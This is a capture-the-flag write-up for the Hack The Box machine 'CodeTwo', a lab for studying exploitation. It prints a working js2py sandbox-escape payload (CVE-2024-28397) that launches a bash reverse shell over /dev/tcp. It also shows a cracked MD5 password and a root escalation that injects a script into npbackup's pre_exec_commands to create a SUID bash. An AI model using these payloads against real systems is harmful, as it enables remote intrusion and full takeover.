# CodeTwo Hack the Box Writeup


## Ip
- 10.10.11.82



## Initial Scan
- ```nmap -sV -sC -oN nmap/code2.nmap 10.10.11.82```

- SSH on port 22: Standard OpenSSH service (potential entry point if we find credentials)
- HTTP on port 8000: Gunicorn web server (Python WSGI HTTP Server)

## Initial access
- Navigating to http://10.10.11.82:8000, we discover a web application called "CodeTwo" that offers:
  - site reg
  - javascript code editor
  - code snippit magnet features

## Source code analysis
- application offers a download feature that provides ```app.zip``` then you are able to get ```app.py```

```from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import js2py

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

- js2py Sandbox Escape (CVE-2024-28397) is identified 
- application uses ```js2py.eval_js()``` to execute user-provided JavaScript
- Despite calling ```js2py.disable_pyimport()```, the library is vulnerable to sandbox escape in versions ≤ 0.74 on Python ≤ 3.11
- weak af password hashing
- exposed key as well

## Exploiting CVE-2024-28397

- CVE-2024-28397 is a sandbox escape vulnerability in js2py that allows attackers to break out of the JavaScript execution environment and execute Python code. The vulnerability exists because js2py doesn't properly isolate JavaScript objects from Python's object model. (claude)

- JavaScript objects in js2py maintain references to Python's internal structures
- Through Object.getOwnPropertyNames, we can access Python's __getattribute__ method
- We traverse Python's class hierarchy using __class__.__base__
- We locate the subprocess.Popen class
- We execute system commands through Popen

## Payload 
```let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.11.82/4444 0>&1'";

let hacked, bymarve, n11;
let getattr, obj;

// Access Python's internal attributes through JS objects
hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");

// Get to Python's base object class
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

// Recursive function to find subprocess.Popen in Python's class hierarchy
function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

// now we execute 
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
"OK";
```
### before I execute the payload
- set up a nc listener ```nc -lvnp 4444```
  
## Then execute the payload in the applications code editor
- and now you have shell

## Now traverse
- marco is in ```/home```
- found sqlite ```/home/app/app/instance/users.db```
- got marcos MD5 hash ```649c9d65a206a75f5abe509fe128bce5``` -> ```sweetangelbabylove```

## Lateral Movement
- su'ed into marcos account
- got userflag ```0a7274c492924335ba414eb8f13ab5e8```
- ```sudo -l``` and found marco can execute ```/usr/local/bin/npbackup-cli```
- also found npbackup config file at ```/home/marco/npbackup.conf```
- changed config to add malicious command in ```pre_exec_commands: ["/tmp/root_shell.sh"]```
- made ```/tmp/root_shell.sh``` script to copy bash and set SUID bit
    ```
    cat > /tmp/root_shell.sh << 'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
    EOF
    chmod +x /tmp/root_shell.sh
    ```
- ```sudo /usr/local/bin/npbackup-cli --config-file /home/marco/npbackup.conf --backup --force```
- created SUID binary ```/tmp/rootbash``` -p to gain root shell
- flag! ```f6eda40e88de9756406a4a16f35b7633```

